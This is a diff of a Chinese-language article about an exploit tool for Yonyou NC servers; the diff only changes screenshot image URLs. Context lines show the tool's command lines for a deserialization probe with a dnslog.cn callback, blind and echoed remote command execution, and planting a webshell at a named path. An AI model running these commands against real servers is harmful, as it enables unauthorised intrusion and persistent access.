@@ -39,7 +39,7 @@ CC6构造链进行任意代码执行。搭配了接口检测功能和URLDNS构�
     
      java -jar nc6.5.jar http://127.0.0.1 Check
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923141244.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923141244.png)
 
   
 
@@ -51,11 +51,11 @@ CC6构造链进行任意代码执行。搭配了接口检测功能和URLDNS构�
     
      java -jar nc6.5.jar http://127.0.0.1 urldns http://123.dnslog.cn
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923141245.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923141245.png)
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923141246.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923141246.png)
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923141248.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923141248.png)
 
  **0x04 无回显命令执行**
 
@@ -65,11 +65,11 @@ CC6构造链进行任意代码执行。搭配了接口检测功能和URLDNS构�
     
      java -jar yonyouNCTools.jar http://192.168.222.130 blind calc.exe
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923141249.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923141249.png)
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923141250.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923141250.png)
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923141252.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923141252.png)
 
 0x05 回显命令执行
 
@@ -79,9 +79,9 @@ CC6构造链进行任意代码执行。搭配了接口检测功能和URLDNS构�
     
     java -jar yonyouNCTools.jar http://192.168.222.130 Execute，通过 Header头传递命令。
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923141254.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923141254.png)
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923141255.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923141255.png)
 
  **0x06 落地 webshell**
 
@@ -94,11 +94,11 @@ CC6构造链进行任意代码执行。搭配了接口检测功能和URLDNS构�
 此处如果使用 java1.8运行，固定落地一个天蝎的 webshell，路径为：http://127.0.0.1/eozZEwBb.jsp，如果使用的是
 java1.7运行，会重新动态编译，可以落地自定义的 webshell，路径随机。
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923141258.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923141258.png)
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923141300.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923141300.png)
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923141302.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923141302.png)
 
  **0x07 下载地址**
 
@@ -126,7 +126,7 @@ java1.7运行，会重新动态编译，可以落地自定义的 webshell，路�
 
 《Python深度学习从零开始学》
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923141304.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923141304.png)
 
 >
 > 本书以通俗易懂的方式详细介绍深度学习的基础理论及其相关知识，同时提供图像识别、情感分析、迁移学习、人脸识别、图像风格迁移、生成对抗网络等案例引导读者入门深度学习。
